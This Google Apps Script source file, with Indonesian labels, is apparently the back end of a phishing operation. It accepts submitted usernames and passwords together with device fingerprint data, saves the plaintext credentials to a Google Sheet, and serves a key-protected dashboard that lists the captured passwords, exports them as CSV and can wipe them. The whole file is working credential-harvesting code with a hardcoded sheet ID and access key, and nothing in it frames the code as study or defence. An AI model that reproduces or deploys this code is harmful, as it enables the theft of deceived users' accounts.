/* ================== KONFIGURASI ================== */
var SHEET_ID   = '1ntinMwNWPBfMeZGcEyr_dKQpiMm9juBCkOhqmkzU2Co';
var SHEET_NAME = 'LOGIN';
var SECRET_KEY = '@704nksJJ';
var HEADERS = ['WAKTU','USERNAME','PASSWORD','DEVICE_ID','PLATFORM','SCREEN','TIMEZONE','LANGUAGE','USER_AGENT','RID'];
/* ================================================= */

function getSs() {
  try {
    return SpreadsheetApp.openById(SHEET_ID);
  } catch (err) {
    throw new Error('Gagal buka spreadsheet. Cek SHEET_ID dan pastikan akun ini punya akses Editor. (' + err.message + ')');
  }
}

function doPost(e) {
  try {
    var p = parse(e);
    if ((p.action || '') !== 'login') return out({ ok: true, info: 'no action' });
    return saveLogin(p);
  } catch (err) {
    return out({ ok: false, error: err.message });
  }
}

function doGet(e) {
  var p = e.parameter || {};

  if (p.action === 'login') {
    try { return saveLogin(p); }
    catch (err) { return out({ ok: false, error: err.message }); }
  }

  if (p.key !== SECRET_KEY) {
    return HtmlService.createHtmlOutput('<p style="font-family:sans-serif">Akses ditolak. Tambahkan <code>?key=KUNCI</code></p>');
  }

  if (p.ping === '1') {
    try {
      var sh = getSheet();
      return out({ ok: true, sheet: sh.getName(), id: SHEET_ID, rows: Math.max(sh.getLastRow() - 1, 0) });
    } catch (err) { return out({ ok: false, error: err.message }); }
  }

  if (p.csv === '1') return exportCsv();
  if (p.clear === '1') return clearAll();
  return HtmlService.createHtmlOutput(dashboard()).setTitle('Data Login');
}

function parse(e) {
  var p = {};
  try {
    var raw = (e.postData && e.postData.contents) || '';
    try { p = JSON.parse(raw); }
    catch (err) {
      p = {};
      raw.split('&').forEach(function (kv) {
        var i = kv.indexOf('=');
        if (i > 0) p[decodeURIComponent(kv.slice(0, i))] = decodeURIComponent(kv.slice(i + 1).replace(/\+/g, ' '));
      });
    }
  } catch (err) { p = {}; }
  if (!p || !Object.keys(p).length) p = e.parameter || {};
  return p;
}

function saveLogin(p) {
  var rid = String(p.rid || '');
  if (rid) {
    var c = CacheService.getScriptCache();
    if (c.get('r_' + rid)) return out({ ok: true, dup: true });
    c.put('r_' + rid, '1', 600);
  }

  var sh = getSheet();
  var row = sh.getLastRow() + 1;

  sh.getRange(row, 1).setValue(new Date());
  sh.getRange(row, 2).setNumberFormat('@').setValue(String(p.username || p.email || ''));
  sh.getRange(row, 3).setNumberFormat('@').setValue(String(p.password || p.pass || ''));
  sh.getRange(row, 4).setNumberFormat('@').setValue(String(p.deviceId || ''));
  sh.getRange(row, 5).setNumberFormat('@').setValue(String(p.platform || ''));
  sh.getRange(row, 6).setNumberFormat('@').setValue(String(p.screen || ''));
  sh.getRange(row, 7).setNumberFormat('@').setValue(String(p.timezone || ''));
  sh.getRange(row, 8).setNumberFormat('@').setValue(String(p.language || ''));
  sh.getRange(row, 9).setNumberFormat('@').setValue(String(p.userAgent || ''));
  sh.getRange(row, 10).setNumberFormat('@').setValue(rid);

  return out({ ok: true, saved: true, row: row });
}

function getSheet() {
  var ss = getSs();
  var sh = ss.getSheetByName(SHEET_NAME);
  if (!sh) {
    sh = ss.insertSheet(SHEET_NAME);
    sh.appendRow(HEADERS);
    sh.setFrozenRows(1);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold').setBackground('#e8f0fe');
    sh.setColumnWidth(1, 150);
    sh.setColumnWidth(3, 160);
  }
  sh.getRange('A:J').setNumberFormat('@');
  return sh;
}

function exportCsv() {
  var sh = getSheet();
  var rows = sh.getDataRange().getValues();
  var csv = rows.map(function (r) {
    return r.map(function (c) {
      var s = (c instanceof Date)
        ? Utilities.formatDate(c, Session.getScriptTimeZone(), 'yyyy-MM-dd HH:mm:ss')
        : String(c);
      return '"' + s.replace(/"/g, '""') + '"';
    }).join(',');
  }).join('\n');
  return ContentService.createTextOutput(csv)
    .setMimeType(ContentService.MimeType.CSV)
    .downloadAsFile('data-login-' + Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyyMMdd-HHmm') + '.csv');
}

function clearAll() {
  var sh = getSheet();
  if (sh.getLastRow() > 1) {
    sh.getRange(2, 1, sh.getLastRow() - 1, HEADERS.length).clearContent();
  }
  return HtmlService.createHtmlOutput('<p style="font-family:sans-serif">Semua data dihapus. <a href="?key=' + SECRET_KEY + '">Kembali</a></p>');
}

function dashboard() {
  var sh = getSheet();
  var last = sh.getLastRow();
  var rows = last > 1 ? sh.getRange(2, 1, last - 1, HEADERS.length).getValues().reverse() : [];
  var tz = Session.getScriptTimeZone();

  function esc(v) {
    return String(v == null ? '' : v)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  var body = rows.map(function (r, i) {
    var waktu = (r[0] instanceof Date)
      ? Utilities.formatDate(r[0], tz, 'dd/MM/yy HH:mm:ss')
      : esc(r[0]);
    return '<tr>'
      + '<td class="n">' + (rows.length - i) + '</td>'
      + '<td class="t">' + esc(waktu) + '</td>'
      + '<td class="u">' + esc(r[1]) + '</td>'
      + '<td class="p"><code>' + esc(r[2]) + '</code></td>'
      + '<td class="s">' + esc(r[4]) + '<br><span class="d">' + esc(r[5]) + ' &middot; ' + esc(r[6]) + '</span></td>'
      + '<td class="s ua">' + esc(r[8]) + '</td>'
      + '</tr>';
  }).join('');

  return '<!DOCTYPE html><html><head><meta charset="utf-8">'
  + '<meta name="viewport" content="width=device-width,initial-scale=1">'
  + '<title>Data Login</title><style>'
  + 'body{font-family:system-ui,Segoe UI,Arial,sans-serif;margin:0;padding:16px;background:#f5f7fa;color:#1e293b}'
  + 'h1{font-size:18px;margin:0 0 4px}span.sub{font-size:12px;color:#64748b}'
  + '.bar{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}'
  + '.bar a{background:#fff;border:1px solid #cbd5e1;border-radius:8px;padding:8px 14px;font-size:13px;color:#1e293b;text-decoration:none;font-weight:600}'
  + '.bar a.red{color:#b91c1c;border-color:#fca5a5}'
  + 'table{width:100%;border-collapse:collapse;background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.08);font-size:13px}'
  + 'th{background:#e8eef7;text-align:left;padding:9px;font-size:11px;text-transform:uppercase;letter-spacing:.4px;color:#475569}'
  + 'td{padding:9px;border-top:1px solid #eef2f7;vertical-align:top}'
  + 'td.n{color:#94a3b8;width:34px}td.t{white-space:nowrap;font-size:12px}'
  + 'td.u{font-weight:700;word-break:break-all}'
  + 'td.p code{background:#fef3c7;padding:2px 6px;border-radius:4px;font-size:12.5px;word-break:break-all}'
  + 'td.ua{font-size:10.5px;color:#94a3b8;max-width:260px;word-break:break-word}'
  + 'span.d{color:#94a3b8;font-size:11px}'
  + '@media(max-width:760px){td.ua{display:none}th:nth-child(6){display:none}}'
  + '</style></head><body>'
  + '<h1>Data Login Terekam</h1>'
  + '<span class="sub">Total: ' + rows.length + ' baris &middot; ' + esc(Utilities.formatDate(new Date(), tz, 'dd MMM yyyy HH:mm')) + '</span>'
  + '<div class="bar"><a href="?key=' + SECRET_KEY + '">Muat ulang</a>'
  + '<a href="?key=' + SECRET_KEY + '&csv=1">Download CSV</a>'
  + '<a href="' + getSs().getUrl() + '" target="_blank">Buka Spreadsheet</a>'
  + '<a class="red" href="?key=' + SECRET_KEY + '&clear=1" onclick="return confirm(\'Hapus semua data?\')">Hapus semua</a></div>'
  + '<table><thead><tr><th>#</th><th>Waktu</th><th>Username</th><th>Password</th><th>Perangkat</th><th>User Agent</th></tr></thead>'
  + '<tbody>' + (body || '<tr><td colspan="6" style="text-align:center;padding:24px;color:#94a3b8">Belum ada data</td></tr>') + '</tbody></table>'
  + '</body></html>';
}

function out(o) {
  return ContentService.createTextOutput(JSON.stringify(o)).setMimeType(ContentService.MimeType.JSON);
}